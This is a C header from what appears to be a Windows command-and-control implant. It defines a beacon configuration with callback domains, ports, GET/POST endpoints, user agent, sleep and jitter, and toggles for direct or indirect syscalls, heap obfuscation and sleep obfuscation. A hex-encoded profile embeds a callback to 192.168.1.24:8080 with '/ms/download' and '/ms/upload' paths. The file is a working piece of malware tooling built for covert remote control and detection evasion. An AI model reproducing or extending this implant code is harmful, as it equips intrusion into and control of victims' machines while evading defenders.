#pragma once
#include <windows.h>

#define MAX_DOMAIN_COUNT 3 // todo, computer and update this at payload generation

typedef struct _DomainEntry {
	CHAR domain[256];
	UINT  port;
	BOOL isHttps;
	BOOL isDead;
	BOOL isSecondChance;
}DomainEntry;



struct Config {
	DomainEntry domains[MAX_DOMAIN_COUNT];
	size_t domaincounts;


	// also calcuate these 3 below at generation time
	CHAR GetEndpoint[64];
	CHAR PostEndpoint[64];
	CHAR UA[64];



	UINT Sleep;
	UINT Jitter;
	UINT SyscallType; // 0 = no syscalls | 1 = direct | 2 = indirect
	UINT UseHeapObf; //  0 = no | 1 = yes
	UINT SleepObf;   //   0 = no | 1 = yes
};


inline PBYTE GetProfile() {
	return (PBYTE)"\x01\x00\x00\x00\x0d\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x34\x00\x90\x1f\x00\x00\x01\x00\x00\x00\x0d\x00\x00\x00\x2f\x6d\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x00\x0b\x00\x00\x00\x2f\x6d\x73\x2f\x75\x70\x6c\x6f\x61\x64\x00";
}


inline UINT GetProfileSize() {
	return 61;
}


BOOL LoadConfig();
extern Config* conf;